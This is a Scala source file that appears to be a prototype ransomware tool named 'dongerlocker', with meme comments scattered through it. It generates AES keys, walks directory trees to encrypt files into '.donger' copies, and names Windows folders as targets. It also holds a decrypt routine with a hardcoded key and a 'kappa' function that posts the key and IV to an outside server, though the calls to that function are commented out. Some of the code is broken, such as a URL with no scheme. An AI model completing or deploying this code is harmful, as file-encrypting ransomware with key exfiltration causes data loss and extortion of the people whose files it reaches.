/**
 * Created by techy on 2/24/15.
 */

import java.io.{FileOutputStream, File, DataOutputStream}
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.{IvParameterSpec, SecretKeySpec}
import javax.net.ssl.HttpsURLConnection
import scala.util.Random
import scala.collection.JavaConversions._

abstract class Donger() {

  def encrypt(data: Array[Byte], secret:Array[Byte], iv:Array[Byte]): Array[Byte] = {
    val key = new SecretKeySpec(secret, "AES")
    println("key good")
    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv))
    println("init good")
    cipher.doFinal(data)
  }
  def decrypt(data: Array[Byte], secret:Array[Byte], iv:Array[Byte]): Array[Byte] = {
    val key = new SecretKeySpec(secret, "AES")
    println("key good")
    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    println("cipher good")
    cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv))
    println("init good")
    cipher.doFinal(data)
  }
  def toByteArray(file: File): Array[Byte] = {
    val source = scala.io.Source.fromFile(file, "ISO-8859-1")
    val byteArray = source.map(_.toByte).toArray
    source.close()
    byteArray
  }

  def getFileTree(f: File): Stream[File] =
    f #:: (if (f.isDirectory) f.listFiles().toStream.flatMap(getFileTree).filter(p => p.isFile)
    else Stream.empty)

  def hex(buf: Array[Byte]): String = buf.map("%02X" format _).mkString

  def unhex(hex:String):Array[Byte] =
    hex.replaceAll("[^0-9A-Fa-f]", "")
    .sliding(2, 2).toArray
    .map(Integer.parseInt(_, 16).toByte)


  def kappa(key: String, iv:String, msg:String): Int =  {
    val url = new URL("1.2.3.4/donger")
    val con = (url.openConnection()).asInstanceOf[HttpsURLConnection]
    con.setRequestProperty("User-Agent", "Kappa Face (no space)")
    con.setRequestProperty("Accept-Language", "en-US,en;q=0.5")
    val urlParameters = s"key={$key}&iv=${iv}&msg=imaqtpie"
    con.setDoOutput(true)
    val wr = new DataOutputStream(con.getOutputStream())
    wr.writeBytes(urlParameters)
    wr.flush()
    wr.close()
    con.getResponseCode()
  }
  def raiseDonger()
}
object Donger {
  val KEYSIZE = 32
  val IVSIZE = 16
  def main(args: Array[String]) {
    var donger:Donger = null
    val random = new Random
    val key = new Array[Byte](KEYSIZE)
    val IV = new Array[Byte](IVSIZE)
    random.nextBytes(key)
    random.nextBytes(IV)
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
      donger = new WindersDonger(key, IV)
    } else {
      donger = new LinuxDonger(key, IV)
    }
    donger.raiseDonger()
  }
}

class WindersDonger(key: Array[Byte], iv:Array[Byte]) extends Donger {
  val TO_ENCRYPT = List[String]("My Documents", "Program Files")
  def raiseDonger() {
    println("(ง ͠ ͠° ل͜ °)ง  WINDERS DONGER RAISED, SIR")
    println(s"Key -> ${this.hex(key)}")
    println(s"IV -> ${this.hex(iv)}")
    //kappa(this.hex(key), this.hex(iv), "(ง ͠ ͠° ل͜ °)ง  WINDERS DONGER RAISED, SIR")
  }
}
class LinuxDonger(key: Array[Byte], iv:Array[Byte]) extends Donger {
  def raiseDonger() {

    println(" (ง ͠ ͠° ل͜ °)ง LINUS DONGER RAISED, SIR (ง ͠ ͠° ل͜ °)ง")
    println(s"Key -> ${this.hex(key)}")
    println(s"IV -> ${this.hex(iv)}")
    println("equal -> " + java.util.Arrays.equals(this.key, this.unhex(this.hex(this.key))))


    //kappa(this.hex(key), this.hex(iv), "(ง ͠ ͠° ل͜ °)ง  LINUXk DONGER RAISED, SIR")
    println("dec_test")
//    enc_test(DIR(0))
    //Console.readLine
    dec_test(DIR(0))

  }
  def enc_test(entryDir: String) {
    getFileTree(new File(entryDir)).foreach(
      f => {
        if(!f.isDirectory && !f.toString.contains(".donger")) {
          var out:FileOutputStream = null
          try {
            println("Encrypting " + f)
            println("key" + key.length)
            println("iv" + iv.length)
            val outBytes = encrypt(toByteArray(f), key,iv)
            out = new FileOutputStream(f.toString + ".donger")
            out.write(outBytes)
            out.close
            println(f.toString)
          } catch {
            case e:Exception => println(e.toString)
          } finally {
            if(out != null) out.close
          }
        }
      })
  }

  def dec_test(entryDir: String) {
    getFileTree(new File(entryDir)).filter(p => p.toString.contains(".donger")).foreach(
      f => {
        var out:FileOutputStream = null
        try {
          val outBytes = decrypt(toByteArray(f), unhex("A9FE1C857B49533234259F13E4BB3162A32F2C3799955A84DC74FD6730546424"), unhex("ECC30AFB10AD1A916746C013E119E93F"))
          out = new FileOutputStream(f.toString + ".dongerdec")
          out.write(outBytes)
          out.close
          println(f.toString)
        } catch {
          case e:Exception => println(e.toString)
        } finally {
          if(out != null) out.close
        }
      })
  }
  val LINUX_WHITELIST = List[String](
    "cat", "wall", "echo", "bash", "ifconfig", "ls", "chmod", "rm",  "openssl"
  )
  val DIR = List[String](
    "/Users/techy/git/dongerlocker/derp/")
}

// (っ-̶●̃益●̶̃)っ
// ( ° ͜ʖ͡°)
//~(˘▾˘~) Wave Your Dongers (~˘▾˘)~
//ლ(́◉◞౪◟◉‵ლ) let me hold your donger for a while ლ(́◉◞౪◟◉‵ლ)
//(▀̿ ̿Ĺ̯̿̿▀̿ ̿) IM DONG,JAMES DONG (▀̿ ̿Ĺ̯̿̿▀̿ ̿)
//(ง°ل͜°)ง I TRIED TO SILENCE MY DONGER ONCE; BOY THAT WENT WELL (ง°ل͜°)ง
// (ง ͡ʘ ͜ʖ ͡ʘ)ง GO RUSTY GO(ง ͡ʘ ͜ʖ ͡ʘ)ง